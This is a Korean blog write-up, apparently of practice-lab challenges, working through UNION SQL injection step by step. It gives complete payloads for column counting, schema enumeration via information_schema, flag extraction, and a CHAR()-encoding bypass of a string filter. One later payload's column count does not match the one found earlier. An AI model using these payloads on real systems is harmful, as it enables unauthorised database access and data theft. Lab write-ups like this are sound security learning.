---
title: "UNION SQL Injection"
date: 2025-06-02
layout: single
toc: true
toc_label: "Union SQLI"
toc_icon: "book"
toc_sticky: true
tags: [web, sqli, union, hacking]
header:
  teaser: /assets/images/register-login.png
---

# 문제 풀이 정리

## SQL Injection 1

![가장 처음 게시판](/assets/screenshots/union-sqli/sql_1_board.png)

처음 페이지에서 검색어에 따라 `ID`, `Level`, `Rank Point`, `Rate`와 같은 게시판 정보가 출력되는 것을 확인했다. 예를 들어 **ID에는 `NORMALTIC`**, **Level에는 `52`** 등의 값이 출력되며 총 **4개의 정보**가 나타났다.

후에 이제 컬럼 수를 확인하기 위해 **normaltic'+order+by+5--+**를 입력했을 때 게시물이 출력되지 않았고,
**normaltic'+order+by+4--+**까지는 정상적으로 게시물이 출력되는 것을 확인하여 칼럼 수가 **4개**임을 유추할 수 있었다.

![union select](/assets/screenshots/union-sqli/sql_1_database.png)

컬럼 수가 확인된 뒤, `UNION SELECT` 문을 통해 데이터를 삽입해보았다.

```html
normaltic'+union+select+database(),'lll',3,4--+
```

를 입력하자 검색 결과 중 하나에 **sqli_1**이라는 문자열이 출력되었고, 이를 통해 현재 사용 중인 데이터베이스의 이름이 **sqli_1**임을 확인할 수 있었다.

이후 `information_schema.tables`를 활용하여 데이터베이스 내 존재하는 테이블 이름을 확인했다. 

```html
normaltic'+union+select+1,'lll',3,(select+table_name+from+information_schema.tables+where+table_schema='sqli_1'+limit+0,1)--+ 
```

쿼리를 통해 **flag_table**이라는 테이블 이름을 추출할 수 있었다.

마찬가지로 `information_schema.columns`를 사용하여 해당 테이블의 컬럼 이름을 찾기 위해 

```html
normaltic'+union+select+1,'lll',3,(select+column_name+from+information_schema.columns+where+table_schema='sqli_1'+and+table_name='flag_table'+limit+0,1)--+
```

를 입력했고, **flag**라는 컬럼명을 알아낼 수 있었다.

마지막으로 실제 데이터를 확인하기 위해 

```html
normaltic'+union+select+1,'lll',3,(select+flag+from+flag_table+limit+0,1)--+
```

쿼리를 사용하면

![sql1 flag](/assets/screenshots/union-sqli/sql_1_flag.png)

**flag를 획득**하였다.

---

## SQL Injection 2 

![가장 처음 게시판](/assets/screenshots/union-sqli/sql_2_board.png)

이번 페이지는 검색어(`ID`)를 입력하면 해당 `ID`에 대한 게시판 정보가 출력되는 구조였으며, **ID 값은 무조건 입력한 그대로 출력**된다.

실제 DB에 존재하지 않더라도 게시판은 항상 최소 하나의 데이터를 출력한다는 특징이 있었고, **정상적인 데이터일 경우 'Info'라는 문구가 출력**되는 것을 확인할 수 있었다.

먼저 컬럼 수를 유추하기 위해 `ORDER BY` 구문을 사용하였다.

**normaltic'+order+by+6%23** 를 입력했을 때 게시물이 정상 출력되었고,
**normaltic'+order+by+7%23** 을 입력하면 게시물이 출력되지 않아, 해당 SELECT 문은 **6개의 컬럼**으로 구성되어 있다는 것을 확인하였다.

![union select](/assets/screenshots/union-sqli/sql_2_database.png)

이후 `UNION SELECT` 구문을 통해 데이터 삽입이 가능한지 확인하였다.
아래의 페이로드를 사용하자 검색 결과 중 하나에 현재 사용 중인 데이터베이스 이름이 출력되었다.

```html
'+union+select+1,2,3,4,5,database()%23
```

출력 결과를 통해 현재 데이터베이스 이름은 **sqli_5**임을 확인하였다.

이어서 `information_schema.tables`를 활용하여 데이터베이스 내 테이블 이름을 조회하였다.

다음과 같은 쿼리를 통해 세 번째 테이블(**LIMIT 2,1**)을 조회한 결과, 테이블 이름으로 **secret**이 출력되었다.

```html
'+union+select+1,2,3,4,5,(select+table_name+from+information_schema.tables+where+table_schema='sqli_5'+limit+2,1)%23
```

`information_schema.columns`를 사용하여 `secret` 테이블의 컬럼명을 확인하기 위해 다음과 같은 쿼리를 입력하였다.

```html
'+union+select+1,2,3,4,5,(select+column_name+from+information_schema.columns+where+table_schema='sqli_5'+and+table_name='secret'+limit+0,1)%23
```

그 결과, 해당 테이블에는 **flag**라는 컬럼이 존재함을 확인하였다.

마지막으로, 다음과 같은 쿼리를 통해 실제 **flag 값**을 추출하였다.

```html
'+union+select+1,2,3,4,5,(select+flag+from+secret+limit+1,1)%23
```

![sql2 flag](/assets/screenshots/union-sqli/sql_2_flag.png)

이렇게 **flag를 획득** 하였다.

---

## 도박 관리자

![가장 처음 게시판](/assets/screenshots/union-sqli/casino_board.png)

처음 게시판은 다음과 같은 형태로 구성되어 있다.

사용자가 직접 입력할 수 있는 검색창이나 입력 필드는 보이지 않았기 때문에, **Burp Suite를 이용해 내부적으로 전달되는 파라미터가 있는지** 확인해보았다. 이를 통해 서버가 어떤 인자를 받아 처리하는지 파악하고자 하였다.

![파라미터](/assets/screenshots/union-sqli/casino_parameter.png)

Burp Suite로 트래픽을 분석한 결과,
`/spec1/game_info.php` 경로에서 `game_name`이라는 **GET 파라미터**를 통해 게임 정보를 전달받고 있는 것을 확인할 수 있었다.

이제 이 `game_name` 파라미터를 이용하여 SQL Injection을 시도해볼 것이다.

앞서 확인한 `game_name` 파라미터에 대해 SQL Injection 가능 여부를 테스트해보기 위해 **논리 조건을 이용한 인젝션**을 시도하였다.

**Lucky%20Slots'%20and%20'1'='1**이라는 SQL 구문을 시도하자 **정상적인 게임 정보가 출력**되었고,
반대로 **Lucky%20Slots'%20and%20'1'='2**와 같은 거짓 조건을 넣었을 때는 **게임 정보가 출력되지 않았다**.

`game_name` 파라미터를 대상으로 `ORDER BY` 구문을 이용해 `SELECT` 문에서 사용되는 **컬럼의 개수**를 확인해보았다.

```html
Lucky%20Slots'%20order%20by%2013--+
```

위 페이로드를 삽입 후 요청 결과

```json
"error": "Database error",
"message": "SQLSTATE[42S22]: Column not found: 1054 Unknown column '13' in 'order clause'"
```

이 에러는 **SELECT 문에서 13번째 컬럼이 존재하지 않음**을 의미한다. 따라서 컬럼 수가 13보다 적다는 것을 알 수 있다.

이후 다음 페이로드를 삽입 후 요청 결과
```html
Lucky%20Slots'%20order%20by%2012--+
```

이번에는 정상적으로 게임 정보가 출력되었으며, 이를 통해 해당 **SELECT 문은 총 12개의 컬럼을 사용하고 있음**을 확인할 수 있었다.

후에 이제 `UNION SELECT` 문을 통해 데이터베이스 정보를 추출해보았다.

![union select](/assets/screenshots/union-sqli/spec1_database.png)

```html
Lucky%20Slots'%20union%20select%201,2,3,4,5,6,7,8,9,10,11,database()--+
```

출력 결과를 통해 현재 사용 중인 데이터베이스는 **spec1**임을 확인할 수 있었다.

후에 이제 `information_schema.tables`를 이용해 데이터베이스 spec1 내의 테이블 목록을 확인해보았다.

다음과 같은 쿼리를 통해 세 번째 테이블(**LIMIT 2,1**)을 조회한 결과, 테이블 이름으로 **secret_flags**가 출력되었다.

```html
Lucky%20Slots'%20union%20select%201,2,3,4,5,6,7,8,9,10,11,(select+table_name+from+information_schema.tables+where+table_schema='spec1'+limit+2,1)--+
```

이후, `secret_flags` 테이블 내부에 어떤 컬럼들이 존재하는지 확인하기 위해 `information_schema.columns`를 조회하였다.

```html
Lucky%20Slots'%20union%20select%201,2,3,4,5,6,7,8,9,10,11,(select+column_name+from+information_schema.columns+where+table_schema='spec1'+and+table_name='secret_flags'+limit+?,1)--+
```

쿼리 실행 결과, 각각 **id, flag_name, flag_value**라는 컬럼명을 확인할 수 있었다.

마지막으로, 이전 단계에서 확인한 `flag_value` 컬럼으로부터 실제 데이터를 추출하기 위해 다음과 같은 쿼리를 사용하였다.

```html
Lucky%20Slots'%20union%20select%201,2,3,4,5,6,7,8,9,10,11,(select+flag_value+from+secret_flags+limit+1,1)--+ 
```

결과
![spec1 flag](/assets/screenshots/union-sqli/spec1_flag.png)

**flag**를 얻을 수 있었다.

---

## SNS Hacking 1

![sns 1 board](/assets/screenshots/union-sqli/sns_1_board.png)

이 게시판도 사용자가 직접 입력할 수 있는 검색창이나 파라미터 입력란이 존재하지 않았다.
따라서 이전과 마찬가지로 Burp Suite를 활용하여 트래픽을 분석하고, 서버로 전달되는 파라미터가 있는지 확인해보았다.

![sns 1 parameter](/assets/screenshots/union-sqli/sns_1_parameter.png)

페이지 코드 상에서는 사용자가 직접 쿼리 문자열을 조작할 수 있는 입력 필드는 존재하지 않았다.
그러나 JavaScript 코드를 분석한 결과, **post.php?id= 및 comments.php?post_id=** 형태로 동작하는 요청이 존재함을 확인할 수 있었다.

`post.php?id=` 파라미터가 서버로 전달되는 것을 확인한 뒤, 이 인자에 대해 **SQL Injection 시도를 진행**하였다.

```html
13+and+1=1--+
```

이후 `ORDER BY` 구문을 이용해 **SELECT 문에서 사용되는 컬럼의 개수**를 파악한 뒤, `UNION SELECT`를 통해 **데이터베이스 이름**을 추출하였다.

> ORDER BY 컬럼 수 확인
```html
13+order+by+8--+
```

> 데이터베이스 이름 추출
```html
13+union+select+database(),2,3,4,5,6,7,8--+
```

![union select](/assets/screenshots/union-sqli/spec2_database.png)

> 데이터베이스 이름 **spec2**

이제 `information_schema.tables`를 이용해 데이터베이스 spec2 내의 테이블 목록을 확인해보았다.

```html
13+union+select+(select+table_name+from+information_schema.tables+where+table_schema='spec2'+limit+2,1),2,3,4,5,6,7,8--+
```

쿼리 실행 결과, 테이블 이름으로 **secret_flags**가 출력되었고, 이후 이 테이블을 대상으로 컬럼 및 데이터를 조회할 수 있었다.

이후 `information_schema.columns`를 사용하여 `secret_flags` 테이블의 컬럼명을 확인하기 위해 다음과 같은 쿼리를 입력하였다.

```html
13+union+select+(select+column_name+from+information_schema.columns+where+table_schema='spec2'+and+table_name='secret_flags'+limit+?,1),2,3,4,5,6,7,8--+
```

쿼리 실행 결과, 아까랑 같은 **id, flag_name, flag_value** 라는 컬럼명을 확인할 수 있었다.

이후 `secret_flags` 테이블에서 실제 플래그 값을 추출하기 위해, `UNION SELECT`와 서브쿼리를 조합한 다음의 SQL 인젝션을 시도하였다.

```html
13+union+select+(select+flag_name+from+secret_flags+limit+5,1),2,3,4,5,6,7,8--+

13+union+select+(select+flag_value+from+secret_flags+limit+5,1),2,3,4,5,6,7,8--+
```

이 결과를 통해 `flag_name` 의 5번째 행이 **real_flag** 임을 확인할 수 있었고, 나머지 행들은 모두 `fake_flag`로 설정되어 있었다.

![spec2 flag](/assets/screenshots/union-sqli/spec2_flag.png)

**이렇게 flag를 얻었다.**

---

## SNS Hacking 2

아까랑 똑같은 게시판 이다.

JavaScript 코드를 분석한 결과, SNS 해킹 1 문제랑 똑같은 **post.php?id= 및 comments.php?post_id=** 형태로 동작하는 요청이 존재함을 확인할 수 있었다.

이번에도 `post.php?id=` 파라미터로 **SQL Injection 시도를 진행**하였다.

하지만 이번 `post.php?id=` 파라미터는 입력값에서 맨 앞의 숫자만 파싱되는 동작을 보이며, `AND`, `OR`, `ORDER BY` 등의 구문을 뒤에 붙여도 영향을 주지 않는다.

따라서 이 파라미터에서는 더 이상의 SQL Injection 시도가 의미가 없다고 판단하였고, 대신 **`comments.php?post_id=` 파라미터를 대상으로 취약점 공략** 을 이어가기로 하였다.

이후 `ORDER BY` 구문을 이용해 **SELECT 문에서 사용되는 컬럼의 개수**를 파악한 뒤, `UNION SELECT`를 통해 **데이터베이스 이름**을 추출하였다.

> ORDER BY 컬럼 수 확인
```html
2+order+by+5--+ 
```

> UNION SELECT 데이터베이스 추출
```html
-1+union+select+database(),2,3,4,5--+
```

![union select](/assets/screenshots/union-sqli/spec3_database.png)

> 데이터베이스 이름 **spec3**

후에 이제 `information_schema.tables`를 이용해 데이터베이스 `spec3` 내의 테이블 목록을 확인해보았다.

```html
-1+union+select+(select+table_name+from+information_schema.tables+where+table_schema='spec3'+limit+0,1),2,3,4,5--+
```

**문자열 리터럴을 포함한 SQL 구문(`'spec3'`)**을 삽입하려 하자, **"error":"Invalid character detected"** 메시지가 출력되며 필터링이 작동하였다. 

이를 우회하기 위해 `'spec3'`을 직접 입력하는 대신, 아래와 같이 `CHAR()` 함수를 사용한 **ASCII 기반 문자열 생성 방식**으로 접근하였다.


```html
-1+union+select+(select+table_name+from+information_schema.tables+where+table_schema=CHAR(115,112,101,99,51)+limit+2,1),2,3,4,5--+
```

쿼리 실행 결과, 테이블 이름으로 **secret_flags**가 출력되었고, 이후 이 테이블을 대상으로 컬럼 및 데이터를 조회할 수 있었다.

이제 `information_schema.columns`를 사용하여 `secret_flags` 테이블의 컬럼명을 확인하기 위해 다음과 같은 쿼리를 입력하였다. 

```html
-1+union+select+(select+column_name+from+information_schema.columns+where+table_schema=CHAR(115,112,101,99,51)+and+table_name=CHAR(115,101,99,114,101,116,95,102,108,97,103,115)+limit+2,1),2,3,4,5--+ 
```

쿼리 실행 결과, 각각 **id, flag_name, flag_value**라는 컬럼명을 확인할 수 있었다.

이후 `flag_value` 컬럼에서 실제 플래그 값을 추출하기 위해, `UNION SELECT`와 서브쿼리를 조합한 다음의 SQL 인젝션을 시도하였다.

```html
-1+union+select+(select+flag_name+from+secret_flags+limit+5,1),2,3,4,5,6,7,8--+

-1+union+select+(select+flag_value+from+secret_flags+limit+5,1),2,3,4,5,6,7,8--+
```

아까와 똑같이 `flag_name` 의 5번째 행이 **`real_flag`**임을 확인할 수 있었고, 나머지 행들은 모두 `fake_flag`로 설정되어 있었다.

![spec3 flag](/assets/screenshots/union-sqli/spec3_flag.png)

이렇게 **flag**를 얻어냈다.
